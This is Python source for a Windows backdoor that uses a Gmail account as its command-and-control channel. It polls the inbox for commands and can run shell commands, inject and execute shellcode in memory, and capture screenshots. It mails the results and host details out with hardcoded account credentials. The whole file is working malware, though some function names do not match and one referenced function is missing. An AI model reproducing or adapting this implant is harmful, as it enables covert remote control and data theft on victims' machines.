import subprocess
import sys
import os
import base64
import binascii
import threading
import time
import random
import string
import imaplib
import email
import uuid
import platform
import ctypes
import ast
import win32process
import win32api
import win32con
import win32gui
import win32security

from PIL import ImageGrab
from traceback import print_exc
from ntsecuritycon import *
from win32com.shell import shell
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#######################################
gmail_user = 'gcat.test.mofo@gmail.com'
gmail_pwd = 'gcatmofo123'
server = "smtp.gmail.com"
server_port = 587
#######################################

#Prints error messages and info to stdout
verbose = True

#generates a unique uuid 
uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))

def genRandomString(slen=10):
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))

def isAdmin():
    return shell.IsUserAnAdmin()

def getSysinfo():
    return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])

def detectForgroundWindow():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def lockWorkstation():
    ctypes.windll.user32.LockWorkStation()

def screenshot():
    try:

        screen_dir = os.getenv('TEMP')

        img=ImageGrab.grab()
        saveas= os.path.join(screen_dir, genRandomString() + '.png')
        img.save(saveas)
        SendEmail('Screenshot taken', [saveas])
        os.remove(saveas)

    except Exception as e:
        if verbose == True: print_exc()
        pass

def execShellcode(shellc):
    try:
        shellcode = bytearray(shellc)

        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
                                                  ctypes.c_int(len(shellcode)), 
                                                  ctypes.c_int(0x3000), 
                                                  ctypes.c_int(0x40))
    
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), 
                                             buf, 
                                             ctypes.c_int(len(shellcode))) 
        
        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))
        
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

    except Exception as e:
        if verbose == True: print_exc()
        

def execCmd(command):
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read()
        stdout_value += proc.stderr.read()

        sendEmail({'CMD': command, 'RES': stdout_value})
    except Exception as e:
        if verbose == True: print_exc()
        pass

def sendEmail(text, attachment=[]):
    msg = MIMEMultipart()
    msg['From'] = uniqueid
    msg['To'] = gmail_user
    msg['Subject'] = uniqueid

    message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': text}
    msg.attach(MIMEText(str(message_content)))
    
    for attach in attachment:
        if os.path.exists(attach) == True:  
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attach, 'rb').read())
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
            msg.attach(part)

    while True:
        try:
            mailServer = SMTP()
            mailServer.connect(server, server_port)
            mailServer.starttls()
            mailServer.login(gmail_user,gmail_pwd)
            mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
            mailServer.quit()
            break
        except Exception as e:
            if verbose == True: print_exc()
            time.sleep(10)


def checkJobs():
    #Here we check the inbox for queued jobs, parse them and send back the results of the commands

    while True:

        try:
            c = imaplib.IMAP4_SSL(server) #Connect to server
            c.login(gmail_user, gmail_pwd)
            c.select(readonly=1)
                
            typ, id_list_single = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
            typ, id_list_all = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:ALL')")

            for id_list in [id_list_single, id_list_all]:
                
                commands = None

                for msg_id in id_list[0].split():

                    typ, msg_data = c.uid('fetch', msg_id, '(RFC822)')

                    for response_part in msg_data:
                        if isinstance(response_part, tuple):
                            msg = email.message_from_string(response_part[1])
                            maintype = msg.get_content_maintype()
                            
                            if maintype == 'multipart':
                                for part in msg.get_payload():
                                    if part.get_content_maintype() == 'text':
                                        commands = part.get_payload().rstrip("\r\n")
                            
                            elif maintype == 'text':
                                commands = msg.get_payload().rstrip("\r\n")

                    if commands:
                        c.store(msg_id, '+FLAGS', r'(\Seen)')

                        commands_dict = ast.literal_eval(command)
                        cmd = commands_dict['CMD']
                        arg = commands_dict['ARG']

                        if cmd == 'execshellcode': 
                            t = threading.Thread(name='execshell', target=execShellcode, args=(arg,))
                        
                        elif cmd == 'download':
                            t = threading.Thread(name='download', target=download, args=(arg,))
                        
                        elif cmd == 'screenshot':
                            t = threading.Thread(name='screenshot', target=screenshot)
                        
                        elif cmd == 'cmd':
                            t = threading.Thread(name='ExecCmd', target=ExecCmd, args=(arg,))

                        else:
                            raise NotImplementedError

                        t.setDaemon(True)
                        t.start()

            c.logout()

            time.sleep(10)
        
        except Exception as e:
            if verbose == True: print_exc()
            time.sleep(10)

if __name__ == '__main__':
    sendEmail("Host checking in")
    try:
        checkJobs()
    except KeyboardInterrupt:
        pass